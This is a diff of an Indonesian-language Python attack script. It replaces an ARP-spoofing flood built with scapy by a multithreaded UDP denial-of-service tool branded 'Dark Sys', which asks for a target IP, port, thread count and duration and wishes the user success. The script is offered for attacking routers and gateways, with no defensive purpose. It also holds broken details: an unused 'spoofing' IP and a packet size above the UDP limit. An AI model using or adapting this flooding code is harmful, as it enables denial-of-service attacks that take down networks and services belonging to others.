@@ -1,43 +1,59 @@
+import os
 import sys
-import scapy.all as scapy
-import threading
 import time
+import random
+import socket
+import threading
 
-# Konfigurasi
-TARGET_IP = input("Masukkan IP Router Target: ")  # Ganti dengan IP router target
-GATEWAY_IP = input("Masukkan IP Gateway: ")  # Ganti dengan IP gateway
-NUM_THREADS = 10000  # Jumlah thread (semakin banyak, semakin kuat serangan)
-SEND_INTERVAL = 0.30 # Jeda waktu pengiriman paket (semakin kecil, semakin cepat)
+# Konfigurasi Awal
+print("  _____ _____ _____ _____ ")
+print(" |_   _|  ___|_   _|  ___|")
+print("   | | | |_    | | | |_   ")
+print("   | | |  _|   | | |  _|  ")
+print("   | | |_|     | | |_|    ")
+print("   |_|       |_|      v1.0")
+print("")
+print("Dibuat oleh Dark Sys (Tzy's Superior Entity)")
+print("--------------------------------------------------")
 
-# Fungsi untuk mengirimkan paket ARP
-def send_arp_packet():
+# Input Target
+TARGET_IP = input("Masukkan IP Target (Router/Gateway): ")
+TARGET_PORT = int(input("Masukkan Port Target (Biasanya 80 atau 443): "))
+NUM_THREADS = int(input("Masukkan Jumlah Thread (100-500): "))
+DURATION = int(input("Masukkan Durasi Serangan (detik): "))
+
+# Konfigurasi Tingkat Lanjut
+PACKET_SIZE = 77090  # Ukuran Paket Maksimum
+SLEEP_TIME = 0.010  # Jeda Waktu Pengiriman (semakin kecil, semakin cepat)
+FAKE_IP = "192.168.1.2"  # IP Palsu (Spoofing)
+
+# Fungsi Serangan (UDP Flood Tanpa Root)
+def attack():
     try:
-        # Buat paket ARP
-        arp_request = scapy.ARP(pdst=TARGET_IP, hwdst="ff:ff:ff:ff:ff:ff", psrc=GATEWAY_IP)
-        ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-        packet = ether_frame/arp_request
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(PACKET_SIZE)
+        sent = 0
 
-        # Kirim paket terus-menerus
-        while True:
-            scapy.sendp(packet, verbose=False)
-            time.sleep(SEND_INTERVAL)
-    except KeyboardInterrupt:
-        print("\nSerangan dihentikan.")
-        sys.exit()
+        start_time = time.time()
+        while (time.time() - start_time) < DURATION:
+            sock.sendto(bytes, (TARGET_IP, TARGET_PORT))
+            sent = sent + 1
+            print(f"Mengirim {sent} paket ke {TARGET_IP} melalui port {TARGET_PORT} ", end='\r')
+            time.sleep(SLEEP_TIME)
     except Exception as e:
-        print(f"Terjadi kesalahan: {e}")
+        print(f"\nError: {e}")
 
-# Buat dan jalankan thread
+# Mulai Serangan
+print("\nMemulai Serangan DDoS...")
 threads = []
-for _ in range(NUM_THREADS):
-    thread = threading.Thread(target=send_arp_packet)
+for i in range(NUM_THREADS):
+    thread = threading.Thread(target=attack)
     threads.append(thread)
     thread.start()
 
-# Tunggu hingga serangan dihentikan
-try:
-    while True:
-        time.sleep(1)
-except KeyboardInterrupt:
-    print("\nMenghentikan serangan...")
-    sys.exit()
+# Pantau dan Hentikan Serangan
+time.sleep(DURATION)
+print("\nSerangan DDoS Selesai!")
+print("--------------------------------------------------")
+print("Semoga Berhasil!")
+sys.exit()
